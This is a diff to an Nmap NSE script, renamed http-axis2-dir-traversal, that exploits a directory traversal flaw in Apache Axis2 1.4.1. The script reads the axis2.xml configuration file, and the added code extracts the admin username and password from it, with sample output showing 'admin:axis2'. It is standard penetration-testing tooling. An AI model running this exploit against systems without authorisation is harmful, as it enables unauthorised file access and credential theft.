@@ -1,5 +1,5 @@
 description = [[
-http-axis2-lfi exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by sending a specially crafted request to the parameter <code>xsd</code> (OSVDB-59001). By default it will try to retrieve the configuration file of the Axis2 service <code>'/conf/axis2.xml'</code> and use the path <code>'/axis2/services/'</code>
+http-axis2-dir-traversal exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by sending a specially crafted request to the parameter <code>xsd</code> (OSVDB-59001). By default it will try to retrieve the configuration file of the Axis2 service <code>'/conf/axis2.xml'</code> and use the path <code>'/axis2/services/'</code> to return the username and password of the admin account.
 
 To exploit this vulnerability we need to detect a valid service running on the installation so we extract it from <code>/listServices</code> before exploiting the directory traversal vulnerability.
 By default it will retrieve the configuration file if you wish to retrieve other files you may need to add more "/../" to traverse to the correct folder location.
@@ -14,11 +14,13 @@ Reference:
 
 ---
 -- @usage
--- nmap -p80,8080 --script http-axis2-lfi --script-args 'http-axis2-lfi.file=' <host/ip>
+-- nmap -p80,8080 --script http-axis2-dir-traversal --script-args 'http-axis2-dir-traversal.file=' <host/ip>
 --
 -- @output
+-- 80/tcp open  http    syn-ack
+-- |_http-axis2-dir-traversal.nse: Admin credentials found -> admin:axis2
 --
--- @args http-axis2-lfi.file Remote file to retrieve
+-- @args http-axis2-dir-traversal.file Remote file to retrieve
 --
 -- Other useful arguments for this script:
 -- @args http.useragent User Agent used in the GET requests
@@ -30,6 +32,7 @@ categories = {"vuln", "intrusive", "exploit"}
 
 require "http"
 require "shortport"
+require "creds"
 
 portrule = shortport.http
 
@@ -68,6 +71,9 @@ end
 ---
 --Writes string to file
 --Taken from: hostmap.nse
+--@param filename Filename to write
+--@param contents Content of file
+--@return True if file was written successfully
 local function write_file(filename, contents)
   local f, err = io.open(filename, "w")
   if not f then
@@ -78,14 +84,31 @@ local function write_file(filename, contents)
   return true
 end
 
+---
+-- Extracts Axis2's credentials from the configuration file
+-- It also adds them to the credentials library.
+--@param body Configuration file string
+--@return true if credentials are found
+--@return Credentials or error string
+---
+local function extract_credentials(host, port, body)
+  local _,_,user = string.find(body, '<parameter name="userName">(.-)</parameter>')
+  local _,_,pass = string.find(body, '<parameter name="password">(.-)</parameter>')
 
+  if user and pass then
+    local cred_obj = creds.Credentials:new( SCRIPT_NAME, host, port )
+    cred_obj:add(user, pass, creds.State.VALID )
+    return true, string.format("Admin credentials found -> %s:%s", user, pass)
+  end
+  return false, "Credentials were not found."
+end
 ---
 --MAIN
 ---
 action = function(host, port)
-  local outfile = stdnse.get_script_args("http-axis2-lfi.outfile") 
-  local rfile = stdnse.get_script_args("http-axis2-lfi.file") or DEFAULT_FILE
-  local basepath = stdnse.get_script_args("http-axis2-lfi.basepath") or DEFAULT_PATH
+  local outfile = stdnse.get_script_args("http-axis2-dir-traversal.outfile") 
+  local rfile = stdnse.get_script_args("http-axis2-dir-traversal.file") or DEFAULT_FILE
+  local basepath = stdnse.get_script_args("http-axis2-dir-traversal.basepath") or DEFAULT_PATH
   local selected_service, output
 
   --check this is an axis2 installation  
@@ -127,7 +150,19 @@ action = function(host, port)
       return
     end
 
-    output[#output+1] = req.body
+    --Retrieve file or only show credentials if downloading the configuration file
+    if rfile ~= DEFAULT_FILE then
+      output[#output+1] = req.body
+    else
+      --try to extract credentials
+      local extract_st, extract_msg = extract_credentials(host, port, req.body)
+      if extract_st then
+        output[#output+1] = extract_msg
+      else
+        stdnse.print_debug(1, "%s: Credentials not found in configuration file", SCRIPT_NAME)
+      end
+    end
+
     --save to file if selected
     if outfile then
       local status, err = write_file(outfile, req.body)
